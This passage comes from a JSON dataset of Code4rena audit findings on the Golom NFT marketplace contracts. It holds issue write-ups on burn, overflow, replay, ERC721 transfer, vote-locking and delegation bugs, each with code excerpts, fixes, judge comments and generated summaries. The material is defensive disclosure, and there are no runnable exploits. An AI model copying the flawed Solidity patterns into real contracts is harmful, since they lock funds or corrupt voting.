Remove token\n        _removeTokenFrom(msg.sender, _tokenId);\n        emit Transfer(owner, address(0), _tokenId);\n    }\n```\n\n### Impact\nApproved callers cannot `merge` or `withdraw` veNFTs. `merge` and `withdraw` may only be called by the token owner.\n\n### Recommended Mitigation Steps\n\nUpdate `_burn` to pass token owner address rather than `msg.sender`:\n\n```solidity\n    function _burn(uint256 _tokenId) internal {\n        require(_isApprovedOrOwner(msg.sender, _tokenId), 'caller is not owner nor approved');\n\n        address owner = ownerOf(_tokenId);\n\n        // Clear approval\n        approve(address(0), _tokenId);\n        // Remove token\n        _removeTokenFrom(owner, _tokenId);\n        emit Transfer(owner, address(0), _tokenId);\n    }\n```\n\n**[zeroexdead (Golom) confirmed](https://github.com/code-423n4/2022-07-golom-findings/issues/858)**\n\n**[zeroexdead (Golom) commented](https://github.com/code-423n4/2022-07-golom-findings/issues/858#issuecomment-1236181856):**\n > Removed `merge` and fixed withdraw here: https://github.com/golom-protocol/contracts/commit/c79913ec08ba2dca87a22f1bc6fe47f65f7b4202\n\n**[0xsaruman (Golom) resolved](https://github.com/code-423n4/2022-07-golom-findings/issues/858)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue with the veNFT contract of the Golom platform. The `merge` and `withdraw` functions of the contract check the `_isApprovedOrOwner` function, which allows either the token owner or an approved spender to call them. However, both functions make internal calls to `_burn`, which does not handle the case of an approved caller correctly. The call to `_removeTokenFrom` passes `msg.sender` rather than the token `owner`, which will cause the `merge` and `withdraw` functions to revert. \n\nThis means that approved callers cannot `merge` or `withdraw` veNFTs and `merge` and `withdraw` may only be called by the token owner. To fix this issue, the `_burn` function should be updated to pass token owner address rather than `msg.sender`.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "https://github.com/code-423n4/2022-07-golom-findings/issues/858",
      "tags": [],
      "finders": [
        "csanuragjain",
        "IllIllI",
        "rotcivegaf",
        "minhquanym",
        "GalloDaSballo",
        "berndartmueller",
        "hansfriese",
        "horsefacts",
        "kenzo"
      ]
    },
    {
      "id": "8743",
      "title": "[M-06] Orders with `tokenAmt` of `type(uint256).max` cannot be cancelled by `GolomTrader.sol#cancelOrder`",
      "impact": "MEDIUM",
      "content": "\n[GolomTrader.sol#L312-L317](https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/core/GolomTrader.sol#L312-L317)<br>\n\nOrder unable to be cancelled by `cancelOrder`.\n\n### Proof of Concept\n\n        filled[hashStruct] = o.tokenAmt + 1;\n\n`cancelOrder` will overflow in the line shown above if `o.tokenAmt` is `type(uint256).max` causing the transaction to always revert for that order.\n\n### Recommended Mitigation Steps\n\nI don't see any reason why 1 should be added to `o.tokenAmt`, change to:\n\n        filled[hashStruct] = o.tokenAmt;\n\n**[0xsaruman (Golom) acknowledged, but disagreed with severity](https://github.com/code-423n4/2022-07-golom-findings/issues/176)**\n\n\n\n***\n\n",
      "summary": "\nA bug has been found in the code of the GolomTrader contract located at the GitHub link provided. The bug occurs when an order is unable to be cancelled by the cancelOrder function due to an overflow in the line: \n\n\"filled[hashStruct] = o.tokenAmt + 1;\"\n\nIf o.tokenAmt is type(uint256).max, the transaction will always revert for that order. To fix this, the line should be changed to \"filled[hashStruct] = o.tokenAmt;\" as there is no reason to add 1 to o.tokenAmt.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "https://github.com/code-423n4/2022-07-golom-findings/issues/176",
      "tags": [],
      "finders": [
        "0x52",
        "GimelSec"
      ]
    },
    {
      "id": "8742",
      "title": "[M-05] Replay attack in case of hard fork",
      "impact": "MEDIUM",
      "content": "\n[GolomTrader.sol#L98](https://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/core/GolomTrader.sol#L98)<br>\n\nIf there is ever a hardfork for Golom then `EIP712_DOMAIN_TYPEHASH` value will become invalid. This is because the chainId parameter is computed in constructor. This means even after hard fork chainId would remain same which is incorrect and could cause possible replay attacks\n\n### Proof of Concept\n\n1.  Observe the constructor\n\n```\nconstructor(address _governance) {\n        // sets governance as owner\n        _transferOwnership(_governance);\n\n        uint256 chainId;\n        assembly {\n            chainId := chainid()\n        }\n\n        EIP712_DOMAIN_TYPEHASH = keccak256(\n            abi.encode(\n                keccak256('EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)'),\n                keccak256(bytes('GOLOM.IO')),\n                keccak256(bytes('1')),\n                chainId,\n                address(this)\n            )\n        );\n    }\n```\n\n2.  As we can see the chainId is derived and then hardcoded in `EIP712_DOMAIN_TYPEHASH`\n\n3.  This means even after hard fork, `EIP712_DOMAIN_TYPEHASH` value will remain same and point to incorrect chainId\n\n### Recommended Mitigation Steps\n\nThe EIP712\\_DOMAIN_TYPEHASH variable should be recomputed everytime by placing current value of chainId.\n\n**[0xsaruman (Golom) confirmed, but disagreed with severity](https://github.com/code-423n4/2022-07-golom-findings/issues/391)**\n\n**[0xsaruman (Golom) resolved and commented](https://github.com/code-423n4/2022-07-golom-findings/issues/391#issuecomment-1236138456):**\n > Resolved https://github.com/golom-protocol/contracts/commit/d8a24442b8f3a764139e312ed393e5d5ffb7e596\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2022-07-golom-findings/issues/391#issuecomment-1276282601):**\n > I'm going to leave this as a medium risk. It would be a very high-impact scenario, but it relies on the external factor of a hard fork. That said, hard forks can and do happen.\n\n\n\n***\n\n",
      "summary": "\nThe bug report describes a vulnerability in the GolomTrader.sol code, which is part of the 2022-07-golom repository on GitHub. The vulnerability is related to the EIP712_DOMAIN_TYPEHASH variable, which is hardcoded in the constructor. If there is ever a hardfork for Golom, the chainId parameter will remain the same, which could lead to possible replay attacks. The recommended mitigation step is to recompute the EIP712_DOMAIN_TYPEHASH variable every time with the current value of chainId.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "https://github.com/code-423n4/2022-07-golom-findings/issues/391",
      "tags": [],
      "finders": [
        "codexploder",
        "0xsanson",
        "teddav",
        "berndartmueller",
        "chatch",
        "0x1f8b",
        "Treasure-Seeker",
        "0xNineDec",
        "RustyRabbit"
      ]
    },
    {
      "id": "8741",
      "title": "[M-04]  `VoteEscrowCore.safeTransferFrom` does not check correct magic bytes returned from receiver contract's `onERC721Received` function",
      "impact": "MEDIUM",
      "content": "\n[ERC721.sol#L395-L417](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/ce0068c21ecd97c6ec8fb0db08570f4b43029dde/contracts/token/ERC721/ERC721.sol#L395-L417)<br>\n\nWhile `VoteEscrowCore.safeTransferFrom` does try to call `onERC721Received` on the receiver it does not check the for the required \"magic bytes\" which is `IERC721.onERC721received.selector` in this case. See [OpenZeppelin docs](https://docs.openzeppelin.com/contracts/3.x/api/token/erc721#IERC721Receiver-onERC721Received-address-address-uint256-bytes-) for more information.\n\nIt's quite possible that a call to `onERC721Received` could succeed because the contract had a `fallback` function implemented, but the contract is not ERC721 compliant.\n\nThe impact is that NFT tokens may be sent to non-compliant contracts and lost.\n\n### Proof of Concept\n\n[Lines 604 - 605](https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L604-L605) are:\n\n```solidity\ntry IERC721Receiver(_to).onERC721Received(msg.sender, _from, _tokenId, _data) returns (bytes4) {} catch (\n    bytes memory reason\n```\n\nbut they should be:\n\n```solidity\ntry IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, data) returns (bytes4 retval) {\n    return retval == IERC721Receiver.onERC721Received.selector;\n} catch (bytes memory reason)\n```\n\n### Recommended Mitigation Steps\n\nImplement `safeTransferReturn` so that it checks the required magic bytes: `IERC721Receiver.onERC721Received.selector`.\n\n**[zeroexdead (Golom) confirmed](https://github.com/code-423n4/2022-07-golom-findings/issues/577)**\n\n**[zeroexdead (Golom) commented](https://github.com/code-423n4/2022-07-golom-findings/issues/577#issuecomment-1236183431):**\n > Fixed.<br>\n> Ref: https://github.com/golom-protocol/contracts/commit/19ba6e83892e24b859f081525c7e0f751f5e7ebb\n\n**[0xsaruman (Golom) resolved, but disagreed with severity](https://github.com/code-423n4/2022-07-golom-findings/issues/577)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the OpenZeppelin Contracts ERC721 token contract. The vulnerability is that the `VoteEscrowCore.safeTransferFrom` function does not check for the required “magic bytes” which is `IERC721.onERC721received.selector`. This means that NFT tokens may be sent to non-compliant contracts and lost. The proof of concept for this vulnerability is that the lines 604 - 605 of the VoteEscrowCore.sol file should be changed from `try IERC721Receiver(_to).onERC721Received(msg.sender, _from, _tokenId, _data) returns (bytes4) {} catch (bytes memory reason` to `try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, data) returns (bytes4 retval) { return retval == IERC721Receiver.onERC721Received.selector; } catch (bytes memory reason)`. To mitigate this vulnerability, it is recommended that the `safeTransferReturn` function should be implemented and should check for the required magic bytes.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "https://github.com/code-423n4/2022-07-golom-findings/issues/577",
      "tags": [],
      "finders": [
        "csanuragjain",
        "IllIllI",
        "0x4non",
        "rbserver",
        "cccz",
        "Jmaxmanblue",
        "arcoun",
        "rotcivegaf",
        "minhquanym",
        "berndartmueller",
        "Lambda",
        "JohnSmith",
        "sseefried"
      ]
    },
    {
      "id": "8740",
      "title": "[M-03] Voter in `VoteEscrowCore` can permanently lock user tokens",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L873-L876><br>\n\n<https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L883-L886><br>\n\n<https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L894><br>\n\n<https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L538><br>\n\n<https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L1008><br>\n\nA malicious voter can arbitrarily increase the number of `attachments` or set the `voted` status of a token to true. This prevents the token from being withdrawn, merged or transfered thereby locking the tokens into the contract for as long as the voter would like.\n\nI submitted this is as a medium severity because it has external circumstances (a malicious voter) however has a very high impact if it does occur.\n\n### Proof of Concept\n\n1.  A user creates a lock for their token and deposits it into the VoteEscrowDelegate/Core contract.\n2.  The malicious voter then calls either `voting()` or `attach()` thereby preventing the user withdrawing their token after the locked time bypasses\n\n### Tools Used\n\nVS Code\n\n### Recommended Mitigation Steps\n\nI have not seen any use of `voting()` or `attach()` in any of the other contracts so it may be sensible to remove those functions altogether. On the other hand, setting voter to be smart contract which is not malicious offsets this problem.\n\n**[zeroexdead (Golom) confirmed](https://github.com/code-423n4/2022-07-golom-findings/issues/712)**\n\n**[zeroexdead (Golom) commented](https://github.com/code-423n4/2022-07-golom-findings/issues/712#issuecomment-1236182159):**\n > Removed Voter: https://github.com/golom-protocol/contracts/commit/03572010ef868597310f4736c91aacf3aa044ce9\n\n**[0xsaruman (Golom) resolved](https://github.com/code-423n4/2022-07-golom-findings/issues/712)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the VoteEscrowCore.sol code which could allow a malicious voter to arbitrarily increase the number of attachments or set the voted status of a token to true. This would prevent the token from being withdrawn, merged or transfered thereby locking the tokens into the contract for as long as the voter would like. The malicious voter could achieve this by calling either the voting() or attach() functions. The impact of this vulnerability is high, as it could cause a user to lose their tokens. \n\nThe vulnerability was found using the VS Code tool. The recommended mitigation steps include either removing the voting() and attach() functions from the code, or setting the voter to be a smart contract which is not malicious.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "https://github.com/code-423n4/2022-07-golom-findings/issues/712",
      "tags": [],
      "finders": [
        "scaraven"
      ]
    },
    {
      "id": "8739",
      "title": "[M-02] Use `safeTransferFrom` Instead of `transferFrom` for ERC721",
      "impact": "MEDIUM",
      "content": "\n[GolomTrader.sol#L236](https://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/core/GolomTrader.sol#L236)<br>\n\nUse of `transferFrom` method for ERC721 transfer is discouraged and recommended to use safeTransferFrom whenever possible by OpenZeppelin.<br>\nThis is because `transferFrom()` cannot check whether the receiving address know how to handle ERC721 tokens.\n\nIn the function shown at below PoC, ERC721 token is sent to `msg.sender` with the `transferFrom` method.<br>\nIf this `msg.sender` is a contract and is not aware of incoming ERC721 tokens, the sent token could be locked up in the contract forever.\n\nReference: <https://docs.openzeppelin.com/contracts/3.x/api/token/erc721>\n\n### Proof of Concept\n```\nGolomTrader.sol:236:            ERC721(o.collection).transferFrom(o.signer, receiver, o.tokenId);\n```\n\n### Recommended Mitigation Steps\n\nI recommend to call the `safeTransferFrom()` method instead of `transferFrom()` for NFT transfers.\n\n**[0xsaruman (Golom) confirmed, but disagreed with severity](https://github.com/code-423n4/2022-07-golom-findings/issues/342)**\n\n**[0xsaruman (Golom) resolved and commented](https://github.com/code-423n4/2022-07-golom-findings/issues/342#issuecomment-1236301290):**\n > Resolved https://github.com/golom-protocol/contracts/commit/366c0455547041003c28f21b9afba48dc33dc5c7#diff-63895480b947c0761eff64ee21deb26847f597ebee3c024fb5aa3124ff78f6ccR238\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue with the use of the transferFrom method for ERC721 token transfers. The use of this method is discouraged and it is recommended to use the safeTransferFrom method instead. This is because the transferFrom method cannot check if the receiving address knows how to handle ERC721 tokens. If the receiving address is a contract which is not aware of incoming ERC721 tokens, the sent token could be locked up in the contract forever.\n\nThe bug report includes a proof of concept which shows the use of the transferFrom method in the function. The bug was discovered using manual analysis.\n\nThe recommended mitigation step is to call the safeTransferFrom() method instead of transferFrom() for NFT transfers. This will ensure that the receiving address is aware of the incoming ERC721 tokens, and that the tokens are not locked up in the contract forever.",
      "quality_score": 4,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "https://github.com/code-423n4/2022-07-golom-findings/issues/342",
      "tags": [
        "transferFrom vs safeTransferFrom",
        "SafeTransfer"
      ],
      "finders": [
        "0x52",
        "i0001",
        "rokinot",
        "0xf15ers",
        "Jujic",
        "brgltd",
        "cryptonue",
        "Bnke0x0",
        "saian",
        "djxploit",
        "Ch_301",
        "_Adam",
        "JC",
        "0xNazgul",
        "PaludoX0",
        "rbserver",
        "arcoun",
        "TomJ",
        "minhquanym",
        "0xDjango",
        "Twpony",
        "Chom",
        "M0ndoHEHE",
        "Lambda",
        "peritoflores",
        "Kenshin",
        "Sm4rty",
        "0x4non",
        "reassor",
        "apostle0x01",
        "0xsanson",
        "cccz",
        "Waze",
        "rotcivegaf",
        "erictee",
        "Ruhum",
        "ellahi",
        "hansfriese",
        "oyc_109",
        "cloudjunky",
        "Treasure-Seeker",
        "Kumpa",
        "sseefried",
        "TrungOre",
        "8olidity",
        "__141345__",
        "CertoraInc",
        "bin2chen",
        "Dravee",
        "GalloDaSballo",
        "shenwilly",
        "RedOneN",
        "benbaessler",
        "GimelSec"
      ]
    },
    {
      "id": "8738",
      "title": "[M-01] Use `call()` rather than `transfer()` on address payable",
      "impact": "MEDIUM",
      "content": "\n[L154](https://github.com/code-423n4/2022-07-golom/blob/main/contracts/core/GolomTrader.sol#L154) in [GolomTrader.sol](https://github.com/code-423n4/2022-07-golom/blob/main/contracts/core/GolomTrader.sol) uses `.transfer()` to send ether to other addresses. There are a number of issues with using `.transfer()`, as it can fail for a number of reasons (specified in the Proof of Concept).\n\n### Proof of Concept\n\n1.  The destination is a smart contract that doesn’t implement a `payable` function or it implements a `payable` function but that function uses more than 2300 gas units.\n2.  The destination is a smart contract that doesn’t implement a `payable` `fallback` function or it implements a `payable` `fallback` function but that function uses more than 2300 gas units.\n3.  The destination is a smart contract but that smart contract is called via an intermediate proxy contract increasing the case requirements to more than 2300 gas units. A further example of unknown destination complexity is that of a multisig wallet that as part of its operation uses more than 2300 gas units.\n4.  Future changes or forks in Ethereum result in higher gas fees than transfer provides. The `.transfer()` creates a hard dependency on 2300 gas units being appropriate now and into the future.\n\n### Tools Used\n\nVim\n\n### Recommended Remediation Steps\n\nInstead use the `.call()` function to transfer ether and avoid some of the limitations of `.transfer()`. This would be accomplished by changing `payEther()` to something like;\n\n```solidity\n(bool success, ) = payable(payAddress).call{value: payAmt}(\"\"); // royalty transfer to royaltyaddress\nrequire(success, \"Transfer failed.\");\n```\n\nGas units can also be passed to the `.call()` function as a variable to accomodate any uses edge cases. Gas could be a mutable state variable that can be set by the contract owner.\n\n**[0xsaruman (Golom) confirmed](https://github.com/code-423n4/2022-07-golom-findings/issues/343)**\n\n**[0xsaruman (Golom) resolved and commented](https://github.com/code-423n4/2022-07-golom-findings/issues/343#issuecomment-1236301220):**\n > Resolved https://github.com/golom-protocol/contracts/commit/366c0455547041003c28f21b9afba48dc33dc5c7#diff-63895480b947c0761eff64ee21deb26847f597ebee3c024fb5aa3124ff78f6ccR154\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2022-07-golom-findings/issues/343#issuecomment-1287092544):**\n > Given how many upgrades I'm making on this, I figured a comment on my reasoning was in order. In many contests, this would be considered low risk. While unlikely to occur without warning, it is well-documented and so very well might occur at some point in the foreseeable future. With Golom's implementation, the entire functionality of the protocol would break if the gas price were to rise, resulting in a need to relaunch/redeploy. The extreme nature of this disruption offsets the other factors normally considered and is why I consider it to be a medium risk in this contest.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability found in the code of GolomTrader.sol, a smart contract. The vulnerability is related to the use of the `.transfer()` function to send ether to other addresses. This function can fail for a number of reasons, such as if the destination is a smart contract that doesn’t implement a `payable` function, or if it implements a `payable` function but that function uses more than 2300 gas units. It can also fail if the destination is a smart contract but that smart contract is called via an intermediate proxy contract, or if future changes or forks in Ethereum result in higher gas fees than transfer provides. To remediate this issue, the recommended solution is to use the `.call()` function instead of `.transfer()`, and to pass the gas units as a variable to the `.call()` function. This will help to avoid some of the limitations of `.transfer()`.",
      "quality_score": 1.0014334963240574,
      "rarity_score": 1.001075122243043,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "https://github.com/code-423n4/2022-07-golom-findings/issues/343",
      "tags": [
        "call vs transfer"
      ],
      "finders": [
        "codexploder",
        "0x52",
        "scaraven",
        "brgltd",
        "cryptonue",
        "Bnke0x0",
        "saian",
        "giovannidisiena",
        "0xNazgul",
        "arcoun",
        "minhquanym",
        "joestakey",
        "Chom",
        "Lambda",
        "peritoflores",
        "0x1f8b",
        "MEP",
        "Noah3o6",
        "IllIllI",
        "reassor",
        "immeas",
        "Ruhum",
        "ellahi",
        "oyc_109",
        "Treasure-Seeker",
        "StyxRave",
        "0xNineDec",
        "durianSausage",
        "CertoraInc",
        "cthulhu_cult",
        "Dravee",
        "GalloDaSballo",
        "0xHarry",
        "dharma09",
        "JohnSmith",
        "navinavu",
        "bulej93",
        "Jmaxmanblue",
        "Jujic",
        "Krow10",
        "rbserver",
        "bardamu",
        "kenzo",
        "Deivitto",
        "cccz",
        "rotcivegaf",
        "hansfriese",
        "cloudjunky",
        "bin2chen",
        "shenwilly",
        "RedOneN",
        "indijanc",
        "GimelSec",
        "0xf15ers",
        "_Adam",
        "TomJ",
        "0xDjango",
        "Kenshin",
        "simon135",
        "jayphbee",
        "bearonbike",
        "0xsolstars",
        "kyteg",
        "zzzitron",
        "sseefried",
        "TrungOre",
        "8olidity",
        "__141345__",
        "StErMi",
        "dipp",
        "obront",
        "rokinot",
        "ladboy233",
        "cryptphi",
        "djxploit",
        "asutorufos",
        "teddav",
        "c3phas",
        "0x4non",
        "0xsanson",
        "horsefacts",
        "jayjonah8",
        "carlitox477",
        "hyh",
        "cRat1st0s"
      ]
    },
    {
      "id": "8737",
      "title": "[H-11] Cannot remove delegation from a token to another token",
      "impact": "HIGH",
      "content": "\n[VoteEscrowDelegation.sol#L213](https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowDelegation.sol#L213)<br>\n\nA user who has delegated the vote of a veGolom token (that he/she owns) to another veGolom token cannot remove the delegation, so the delegatee token will permanently hold the voting power of the delegator token.\n\n### Proof of Concept\n\nA user tries to remove the delegation from `tokenId` he/she owns to the delegated token, calling `removeDelegation(uint256 tokenId)`.<br>\nThe delegation should be removed at the lines:\n\n```solidity\n        Checkpoint storage checkpoint = checkpoints[tokenId][nCheckpoints - 1];\n        removeElement(checkpoint.delegatedTokenIds, tokenId);\n```\n\nbut the array `checkpoint.delegatedTokenIds` is the list of **delegators** to `tokenId` **itself**. So, unless the delegation was from the token to itself, `removeDelegation` does nothing.\n\n### Recommended Mitigation Steps\n\nTwo fixes are proposed:\n\n1.  Add the delegatee as an argument to `removeDelegation` and remove `tokenId` from its list of delegators:\n\n```diff\n-   function removeDelegation(uint256 tokenId) external {\n+   function removeDelegation(uint256 tokenId, uint256 toTokenId) external {\n        require(ownerOf(tokenId) == msg.sender, 'VEDelegation: Not allowed');\n        uint256 nCheckpoints = numCheckpoints[tokenId];\n-       Checkpoint storage checkpoint = checkpoints[tokenId][nCheckpoints - 1];\n+       Checkpoint storage checkpoint = checkpoints[toTokenId][nCheckpoints - 1];\n        removeElement(checkpoint.delegatedTokenIds, tokenId);\n        _writeCheckpoint(tokenId, nCheckpoints, checkpoint.delegatedTokenIds);\n    }\n```\n\nor\n\n2.  Load the delegatee from the mapping `delegates` which maps each delegator to its current delegatee:\n\n```diff\n    function removeDelegation(uint256 tokenId) external {\n        require(ownerOf(tokenId) == msg.sender, 'VEDelegation: Not allowed');\n+       uint256 toTokenId = delegates[tokenId];\n        uint256 nCheckpoints = numCheckpoints[tokenId];\n-       Checkpoint storage checkpoint = checkpoints[tokenId][nCheckpoints - 1];\n+       Checkpoint storage checkpoint = checkpoints[toTokenId][nCheckpoints - 1];\n        removeElement(checkpoint.delegatedTokenIds, tokenId);\n        _writeCheckpoint(tokenId, nCheckpoints, checkpoint.delegatedTokenIds);\n    }\n```\n\n**[kenzo (warden) commented](https://github.com/code-423n4/2022-07-golom-findings/issues/751#issuecomment-1202178536):**\n > Note that in the mitigation, `nCheckpoints` should access `toTokenId` instead of `tokenId`.\n\n**[zeroexdead (Golom) confirmed](https://github.com/code-423n4/2022-07-golom-findings/issues/751)**\n\n**[zeroexdead (Golom) commented](https://github.com/code-423n4/2022-07-golom-findings/issues/751#issuecomment-1236182091):**\n > Fixed. https://github.com/golom-protocol/contracts/commit/4b19fce83ad53bc56b1bad058e1e88d90acda444\n\n**[0xsaruman (Golom) resolved](https://github.com/code-423n4/2022-07-golom-findings/issues/751)**\n\n**[LSDan (judge) increased severity to High and commented](https://github.com/code-423n4/2022-07-golom-findings/issues/751#issuecomment-1277527328):**\n > I agree with the other wardens who rated this high risk. It has a direct impact on the functioning of the protocol and allows for a myriad of governance attacks.\n\n\n\n***\n \n",
      "summary": "\nA bug was found in the code for the VoteEscrowDelegation.sol file on line 213. The bug prevents a user who has delegated the vote of a veGolom token (that they own) to another veGolom token from removing the delegation, meaning the delegatee token will permanently hold the voting power of the delegator token. \n\nThe bug is caused by the array checkpoint.delegatedTokenIds being the list of delegators to tokenId itself, meaning unless the delegation was from the token to itself, the removeDelegation function does nothing. \n\nTwo fixes have been proposed to mitigate this bug. The first fix is to add the delegatee as an argument to removeDelegation and remove tokenId from its list of delegators. The second fix is to load the delegatee from the mapping delegates which maps each delegator to its current delegatee. \n\nIt is important to fix this bug as it prevents users from removing the delegation from their veGolom tokens, meaning the delegatee token will permanently hold the voting power of the delegator token.",
      "quality_score": 5,
      "rarity_score": 1.3333333333333333,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "https://github.com/code-423n4/2022-07-golom-findings/issues/751",
      "tags": [],
      "finders": [
        "panprog",
        "IllIllI",
        "0x52",
        "Bahurum",
        "0xsanson",
        "cccz",
        "scaraven",
        "CertoraInc",
        "GalloDaSballo",
        "berndartmueller",
        "dipp",
        "Green",
        "0xA5DF",
        "GimelSec",
        "MEP",
        "kenzo"
      ]
    },
    {
      "id": "8736",
      "title": "[H-10] Upon changing of delegate, `VoteDelegation` updates both the previous and the current checkpoint",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2022-07-golom/blob/main/contracts/vote-escrow/VoteEscrowDelegation.sol#L79><br>\n\n<https://github.com/code-423n4/2022-07-golom/blob/main/contracts/vote-escrow/VoteEscrowDelegation.sol#L213><br>\n\nThe contract is accidently editing both the previous and current checkpoint when changing/removing a delegate.\n\n### Impact\n\nIncorrect counting of votes.\n\n### Proof of Concept\n\nIf in `delegate` the delegate already has checkpoints, the function will grab the latest checkpoint, and add the `tokenId` to it. Note that it changes the storage variable.\n\n```solidity\n        if (nCheckpoints > 0) {\n            Checkpoint storage checkpoint = checkpoints[toTokenId][nCheckpoints - 1];\n            checkpoint.delegatedTokenIds.push(tokenId);\n            _writeCheckpoint(toTokenId, nCheckpoints, checkpoint.delegatedTokenIds);\n```\n\nIt then calls `_writeCheckpoint`, which [will add](https://github.com/code-423n4/2022-07-golom/blob/main/contracts/vote-escrow/VoteEscrowDelegation.sol#L106) a new checkpoint if there's no checkpoint created for this block yet:\n\n```solidity\n        Checkpoint memory oldCheckpoint = checkpoints[toTokenId][nCheckpoints - 1];\n\n        if (nCheckpoints > 0 && oldCheckpoint.fromBlock == block.number) {\n            oldCheckpoint.delegatedTokenIds = _delegatedTokenIds;\n        } else {\n            checkpoints[toTokenId][nCheckpoints] = Checkpoint(block.number, _delegatedTokenIds);\n            numCheckpoints[toTokenId] = nCheckpoints + 1;\n        }\n```\n\nTherefore, if this function has created a new checkpoint with the passed `_delegatedTokenIds`, we already saw that the previous function has already added `tokenId` to the previous checkpoint, so now both the new checkpoint and the previous checkpoint will have `tokenId` in them.<br>\nThis is wrong as it updates an earlier checkpoint with the latest change.\n\nThe same situation happens in [`removeDelegation`](https://github.com/code-423n4/2022-07-golom/blob/main/contracts/vote-escrow/VoteEscrowDelegation.sol#L213).\n\n### Recommended Mitigation Steps\n\nWhen reading the latest checkpoint:\n\n```solidity\nCheckpoint storage checkpoint = checkpoints[toTokenId][nCheckpoints - 1];\n```\n\nChange the `storage` to `memory`. This way it will not affect the previous checkpoint, but will pass the correct updated array to `_writeCheckpoint`, which will then write/update the correct checkpoint.\n\n**[zeroexdead (Golom) confirmed and commented](https://github.com/code-423n4/2022-07-golom-findings/issues/81#issuecomment-1238529978):**\n > Fixed `delegate()`: https://github.com/golom-protocol/contracts/commit/8a8c89beea22cd57f4ffaf3d0defcce863e9657f\n> \n> Fixed `removeDelegation()`: https://github.com/golom-protocol/contracts/commit/72350b0a3bdae4f21e2f015327037080f6bab867\n\n**[LSDan (judge) increased severity to High and commented](https://github.com/code-423n4/2022-07-golom-findings/issues/81#issuecomment-1276357474):**\n > I went back and forth on if this was a duplicate of [H-04 (#169)](https://github.com/code-423n4/2022-07-golom-findings/issues/169) or not. The two issues are so similar it's hard to pull them apart. Ultimately I do see the difference, mainly that this version of the issue results in a retroactive manipulation of voting power whereas the other issue allows the creation of infinite voting power. I'm upgrading this to high risk because it effectively destroys the integrity of the voting system which impacts every aspect of the protocol which is subject to vote.\n\n\n\n***\n\n",
      "summary": "\nA bug was found in the VoteEscrowDelegation.sol contract, which incorrectly counts votes. The bug occurs when a delegate is changed or removed. The contract is accidently editing both the previous and current checkpoint, which causes an incorrect counting of votes. To fix the bug, the storage variable should be changed to a memory variable when reading the latest checkpoint. This will prevent the previous checkpoint from being affected, and will pass the correct updated array to the _writeCheckpoint function, which will then write/update the correct checkpoint.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "https://github.com/code-423n4/2022-07-golom-findings/issues/81",
      "tags": [],
      "finders": [
        "0xpiglet",
        "IllIllI",
        "0xsanson",
        "Bahurum",
        "arcoun",
        "0xA5DF",
        "kenzo"
      ]
    },
    {
      "id": "8735",
      "title": "[H-09] Repeated calls to `multiStakerClaim` in the same block leads to loss of funds",
      "impact": "HIGH",
